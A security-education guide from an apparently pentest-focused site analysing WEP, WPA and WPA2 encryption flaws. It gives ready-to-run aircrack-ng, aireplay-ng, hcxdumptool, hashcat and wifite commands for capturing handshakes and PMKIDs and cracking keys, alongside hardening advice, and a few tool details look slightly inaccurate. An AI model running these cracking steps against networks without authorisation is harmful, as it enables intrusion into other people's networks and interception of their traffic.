---
title: "WPA/WEP Security Analysis: Deep Dive into WiFi Encryption Vulnerabilities"
description: "Comprehensive technical analysis of WEP and WPA vulnerabilities, attack vectors, and security implementations in wireless networks"
pubDate: 2025-09-03
category: "guides"
tags: ["wpa", "wep", "encryption", "vulnerabilities", "crypto-analysis"]
author: "MITM.life"
difficulty: "intermediate"
readTime: "22 min"
---

# WPA/WEP Security Analysis: Deep Dive into WiFi Encryption Vulnerabilities

## Introduction

Understanding the technical details of WiFi encryption protocols is crucial for security professionals. This guide provides an in-depth analysis of WEP and WPA vulnerabilities, their cryptographic implementations, and practical exploitation techniques.

## WEP (Wired Equivalent Privacy) Analysis

### Cryptographic Foundation

#### RC4 Stream Cipher
```bash
# WEP encryption process
1. 40-bit or 104-bit key + 24-bit IV = 64-bit or 128-bit RC4 key
2. RC4 generates keystream
3. Plaintext XOR keystream = ciphertext
4. CRC-32 checksum for integrity
```

#### Key Structure
```bash
# WEP key composition
- User key: 40-bit (5 bytes) or 104-bit (13 bytes)
- Initialization Vector (IV): 24-bit (3 bytes)
- Combined: 64-bit or 128-bit RC4 seed
```

### Critical Vulnerabilities

#### 1. IV Weakness (FMS Attack)
```bash
# Fluhrer-Mantin-Shamir Attack
- Weak IVs reveal key bytes
- Statistical analysis of weak packets
- ~40,000 packets needed for 40-bit key
- ~85,000 packets needed for 104-bit key

# Weak IV examples
FF:FF:03:XX:XX:XX  # Weak patterns
03:FF:XX:XX:XX:XX
```

#### 2. IV Collision and Reuse
```bash
# Problem: 24-bit IV space
- 2^24 = 16,777,216 possible IVs
- Birthday paradox: collisions after ~5,000 packets
- IV reuse reveals keystream
- Linear IV increment predictable
```

#### 3. CRC-32 Integrity Weakness
```bash
# Linear property of CRC-32
- Predictable modification without detection
- Bit-flipping attacks possible
- No authentication of packet origin
```

### WEP Exploitation Techniques

#### Active Injection Attacks
```bash
# ARP replay attack
sudo airodump-ng -c 6 --bssid [AP_MAC] -w wep_capture wlan0mon

# Fake authentication
sudo aireplay-ng -1 0 -a [AP_MAC] wlan0mon

# ARP packet replay
sudo aireplay-ng -3 -b [AP_MAC] wlan0mon

# Monitor packet generation
# Target: 20,000+ packets for reliable crack
```

#### Korek Attack Implementation
```bash
# Advanced statistical attack
aircrack-ng -K wep_capture-01.cap  # Use Korek method

# PTW (Pyshkin-Tews-Weinmann) attack
aircrack-ng -P wep_capture-01.cap  # More efficient
```

#### Caffe Latte Attack
```bash
# Client-side attack when AP is down
# Requires captured packet from target client
# Replays packet to force client to generate traffic
```

## WPA (WiFi Protected Access) Analysis

### Cryptographic Improvements

#### TKIP (Temporal Key Integrity Protocol)
```bash
# Key hierarchy
PMK (Pairwise Master Key) -> 256 bits from passphrase
PTK (Pairwise Transient Key) -> 512 bits from 4-way handshake
TK (Temporal Key) -> 128 bits for encryption
```

#### Michael MIC
```bash
# Message Integrity Check
- 64-bit authentication code
- Per-packet authentication
- Replay protection with sequence numbers
- Countermeasures for detected attacks
```

### WPA Vulnerabilities

#### 1. Weak Passphrase Vulnerability
```bash
# PBKDF2 key derivation
PMK = PBKDF2(passphrase, SSID, 4096, 256)

# Dictionary attack against 4-way handshake
# No rate limiting on offline attacks
# Rainbow tables for common SSIDs
```

#### 2. 4-Way Handshake Capture
```bash
# Handshake process
1. AP -> Client: ANonce (random number)
2. Client -> AP: SNonce + MIC
3. AP -> Client: GTK (Group Temporal Key) + MIC
4. Client -> AP: Acknowledgment

# Attack: Capture message 2 for offline cracking
```

#### 3. Michael MIC Vulnerabilities
```bash
# Beck-Tews Attack (2008)
- 12-15 minute attack window
- Requires QoS-enabled AP
- Can decrypt/inject packets
- Limited to TKIP networks
```

## WPA2 Security Analysis

### AES-CCMP Implementation
```bash
# Counter Mode with CBC-MAC Protocol
- AES 128-bit encryption
- CCMP for authentication and integrity
- 48-bit replay counter
- 64-bit MIC (Message Integrity Check)
```

### WPA2 Attack Vectors

#### 1. KRACK Attack (2017)
```bash
# Key Reinstallation Attacks
- Exploits 4-way handshake vulnerabilities
- Forces nonce reuse
- Can decrypt traffic and forge packets
- Affects client implementations
```

#### 2. Dictionary Attacks
```bash
# Enhanced methods for WPA2
hcxpcapngtool -o hash.hc22000 capture.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt

# GPU acceleration improves speed significantly
# Custom wordlists based on target organization
```

#### 3. PMKID Attack
```bash
# Hashcat PMKID attack
- No 4-way handshake needed
- Requests PMKID from AP
- Offline dictionary attack possible

# Capture PMKID
hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1

# Extract PMKID
hcxpcapngtool -z pmkid.txt pmkid_capture.pcapng

# Crack offline
hashcat -m 16800 pmkid.txt rockyou.txt
```

## Practical Security Analysis

### Network Assessment Methodology

#### 1. Encryption Protocol Detection
```bash
# Identify security implementation
sudo airodump-ng wlan0mon | grep -E "(WEP|WPA|WPA2)"

# Detailed protocol analysis
tshark -i wlan0mon -f "wlan type mgt subtype beacon" -T fields -e wlan.ssid -e wlan.fixed.capabilities.privacy

# Check for mixed mode vulnerabilities
```

#### 2. Key Strength Analysis
```bash
# Passphrase complexity assessment
# Common patterns to identify:
- Default router passwords
- Dictionary words + numbers
- Company name variations
- Location-based passwords
- Keyboard patterns (qwerty123)
```

#### 3. Implementation Flaws
```bash
# Common configuration weaknesses
- WPS enabled (PIN brute force vulnerability)
- Mixed WPA/WPA2 mode
- Short passphrase (<15 characters)
- Default credentials
- Outdated firmware
```

### Advanced Analysis Techniques

#### 1. Traffic Pattern Analysis
```bash
# Monitor network behavior
sudo tshark -i wlan0mon -f "wlan addr3 [AP_MAC]" -T fields -e frame.time -e wlan.sa -e wlan.da

# Identify:
- Client connection patterns
- Data transmission volumes
- Authentication frequency
- Roaming behavior
```

#### 2. Cryptographic Analysis
```bash
# Examine key derivation
# For WPA/WPA2: PMK = PBKDF2(passphrase, SSID, 4096, 256)

# Tools for analysis
python -c "
import hashlib
import binascii
from pbkdf2 import PBKDF2

passphrase = 'password123'
ssid = 'TestNetwork'
pmk = PBKDF2(passphrase, ssid, 4096).read(32)
print('PMK:', binascii.hexlify(pmk))
"
```

#### 3. Vulnerability Correlation
```bash
# Cross-reference findings
- Weak encryption + Poor key management
- Open authentication + MAC filtering only
- Strong encryption + Default credentials
- Updated protocols + Legacy client support
```

## Defense Analysis and Recommendations

### WEP Migration Strategy
```bash
# Immediate actions for WEP networks
1. Disable WEP immediately
2. Upgrade to WPA2 minimum
3. Change all network credentials
4. Audit connected devices
5. Monitor for unauthorized access

# Cannot be secured - only replacement viable
```

### WPA/WPA2 Hardening
```bash
# Security enhancements
1. Strong passphrase (20+ characters)
2. Disable WPS
3. Regular credential rotation
4. Enterprise authentication (802.1X)
5. Client certificate authentication
```

### Advanced Protection Mechanisms
```bash
# Additional security layers
- Network segmentation (VLANs)
- NAC (Network Access Control)
- IDS/IPS monitoring
- Certificate-based authentication
- Regular penetration testing
```

## Testing and Validation Tools

### Comprehensive Test Suite
```bash
# WEP testing tools
aircrack-ng      # Standard cracking
wesside-ng       # Automatic WEP cracker
easside-ng       # WEP key recovery

# WPA/WPA2 testing tools
hashcat          # GPU-accelerated cracking
john             # Traditional password cracking
coWPAtty         # WPA-PSK auditing
```

### Automated Assessment
```bash
# Wifite automation
sudo wifite --wep --wps --timeout 300 --crack-dir results/

# Custom testing scripts
#!/bin/bash
# wifi_audit.sh
INTERFACE="wlan0mon"
OUTPUT_DIR="wifi_audit_$(date +%Y%m%d)"

mkdir -p "$OUTPUT_DIR"
sudo airodump-ng "$INTERFACE" -w "$OUTPUT_DIR/scan" --write-interval 1 &
sleep 300
sudo pkill airodump-ng
```

### Reporting and Documentation
```bash
# Generate comprehensive reports
- Network inventory
- Vulnerability assessment
- Risk prioritization
- Remediation roadmap
- Compliance gap analysis
```

## Real-World Case Studies

### Case 1: Corporate WEP Legacy
```bash
# Scenario: Manufacturing company with legacy WEP
Assessment findings:
- 50+ WEP networks identified
- Default keys on 80% of networks
- Critical systems accessible
- No network segmentation

Remediation:
- Immediate WEP disable
- WPA2-Enterprise deployment
- Network redesign with segmentation
- Staff security training
```

### Case 2: WPA2 Dictionary Attack Success
```bash
# Scenario: Small business with weak passphrase
Target: "CompanyName2020"
Attack method: Custom wordlist + rules
Time to crack: 15 minutes
Impact: Full network access, data exposure

Lessons learned:
- Complex passphrases essential
- Regular password changes needed
- Monitor for unauthorized access
```

## Future Considerations

### WPA3 Migration
```bash
# Enhanced security features
- SAE (Simultaneous Authentication of Equals)
- Forward secrecy
- 192-bit security mode for enterprise
- Enhanced protection against offline attacks
```

### Emerging Threats
```bash
# New attack vectors to monitor
- Side-channel attacks
- Implementation-specific vulnerabilities  
- IoT device weaknesses
- Supply chain compromises
```

## Conclusion

Understanding WEP and WPA vulnerabilities is essential for effective wireless security. The progression from broken WEP to increasingly robust WPA implementations shows the evolution of wireless security.

### Key Technical Insights
1. **WEP is cryptographically broken and must be replaced**
2. **WPA/WPA2 security depends heavily on passphrase strength**
3. **Implementation details matter as much as protocol design**
4. **Layered security approach is essential**
5. **Regular assessment and updates are critical**

### Next Steps
- Implement [WiFi Security Assessment](wifi-security-assessment.md) methodology
- Study [WiFi Security Tools](../tools/wifi-security-tools.md) for practical application
- Explore [Advanced WiFi Penetration Testing](red-team-wifi-penetration-testing.md) techniques

## References

- [IEEE 802.11 Security Analysis](https://standards.ieee.org/standard/802_11i-2004.html)
- [RFC 3610 - Counter with CBC-MAC (CCM)](https://tools.ietf.org/rfc/rfc3610.txt)
- [WPA3 Specification](https://www.wi-fi.org/file/wpa3-specification)
- [Aircrack-ng Security Research](https://aircrack-ng.org/papers/)